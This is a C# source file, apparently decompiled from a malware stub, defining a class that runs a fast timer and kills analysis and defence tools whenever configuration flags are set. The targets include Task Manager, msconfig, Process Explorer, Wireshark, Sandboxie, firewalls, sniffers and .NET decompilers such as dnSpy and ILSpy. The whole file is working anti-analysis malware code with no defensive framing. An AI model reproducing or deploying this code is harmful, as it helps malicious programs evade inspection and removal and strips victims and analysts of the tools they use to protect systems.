using System.Diagnostics;
using System.Timers;
using Microsoft.VisualBasic.CompilerServices;
using Stub;

public class CsAntiProcess
{
	private static Fransesco n = new Fransesco();

	private static Timer _timer;

	[DebuggerNonUserCode]
	public CsAntiProcess()
	{
	}

	public static void Handler(object sender, ElapsedEventArgs e)
	{
		if (Fransesco.prs == Conversions.ToBoolean("True"))
		{
			Process[] processesByName = Process.GetProcessesByName("processhacker");
			foreach (Process process in processesByName)
			{
				process.Kill();
			}
		}
		if (Fransesco.exp == Conversions.ToBoolean("True"))
		{
			Process[] processesByName2 = Process.GetProcessesByName("dnSpy");
			foreach (Process process2 in processesByName2)
			{
				process2.Kill();
			}
		}
		if (Fransesco.ess == Conversions.ToBoolean("True"))
		{
			Process[] processesByName3 = Process.GetProcessesByName("procexp");
			foreach (Process process3 in processesByName3)
			{
				process3.Kill();
			}
		}
		if (Fransesco.sbi == Conversions.ToBoolean("True"))
		{
			Process[] processesByName4 = Process.GetProcessesByName("SbieCtrl");
			foreach (Process process4 in processesByName4)
			{
				process4.Kill();
			}
		}
		if (Fransesco.spy == Conversions.ToBoolean("True"))
		{
			Process[] processesByName5 = Process.GetProcessesByName("SpyTheSpy");
			foreach (Process process5 in processesByName5)
			{
				process5.Kill();
			}
		}
		if (Fransesco.war == Conversions.ToBoolean("True"))
		{
			Process[] processesByName6 = Process.GetProcessesByName("wireshark");
			foreach (Process process6 in processesByName6)
			{
				process6.Kill();
			}
		}
		if (Fransesco.dns == Conversions.ToBoolean("True"))
		{
			Process[] processesByName7 = Process.GetProcessesByName("apateDNS");
			foreach (Process process7 in processesByName7)
			{
				process7.Kill();
			}
		}
		if (Fransesco.aip == Conversions.ToBoolean("True"))
		{
			Process[] processesByName8 = Process.GetProcessesByName("IPBlocker");
			foreach (Process process8 in processesByName8)
			{
				process8.Kill();
			}
		}
		if (Fransesco.tag == Conversions.ToBoolean("True"))
		{
			Process[] processesByName9 = Process.GetProcessesByName("TiGeR-Firewall");
			foreach (Process process9 in processesByName9)
			{
				process9.Kill();
			}
		}
		if (Fransesco.sms == Conversions.ToBoolean("True"))
		{
			Process[] processesByName10 = Process.GetProcessesByName("smsniff");
			foreach (Process process10 in processesByName10)
			{
				process10.Kill();
			}
		}
		if (Fransesco.rcd == Conversions.ToBoolean("True"))
		{
			Process[] processesByName11 = Process.GetProcessesByName("NetSnifferCs");
			foreach (Process process11 in processesByName11)
			{
				process11.Kill();
			}
		}
		if (Fransesco.san == Conversions.ToBoolean("True"))
		{
			Process[] processesByName12 = Process.GetProcessesByName("Sandboxie Control");
			foreach (Process process12 in processesByName12)
			{
				process12.Kill();
			}
		}
		if (Fransesco.ger == Conversions.ToBoolean("True"))
		{
			Process[] processesByName13 = Process.GetProcessesByName("taskmgr");
			foreach (Process process13 in processesByName13)
			{
				process13.Kill();
			}
		}
		if (Fransesco.mas == Conversions.ToBoolean("True"))
		{
			Process[] processesByName14 = Process.GetProcessesByName("msconfig");
			foreach (Process process14 in processesByName14)
			{
				process14.Kill();
			}
		}
		if (Fransesco.ils == Conversions.ToBoolean("True"))
		{
			Process[] processesByName15 = Process.GetProcessesByName("ILSpy");
			foreach (Process process15 in processesByName15)
			{
				process15.Kill();
			}
		}
		if (Fransesco.@ref == Conversions.ToBoolean("True"))
		{
			Process[] processesByName16 = Process.GetProcessesByName("CodeReflect");
			foreach (Process process16 in processesByName16)
			{
				process16.Kill();
			}
		}
		if (Fransesco.rfl == Conversions.ToBoolean("True"))
		{
			Process[] processesByName17 = Process.GetProcessesByName("Reflector");
			foreach (Process process17 in processesByName17)
			{
				process17.Kill();
			}
		}
		if (Fransesco.exl == Conversions.ToBoolean("True"))
		{
			Process[] processesByName18 = Process.GetProcessesByName("MegaDumper");
			foreach (Process process18 in processesByName18)
			{
				process18.Kill();
			}
		}
	}

	public static void Start()
	{
		_timer = new Timer(5.0);
		_timer.Elapsed += Handler;
		_timer.Enabled = true;
	}
}
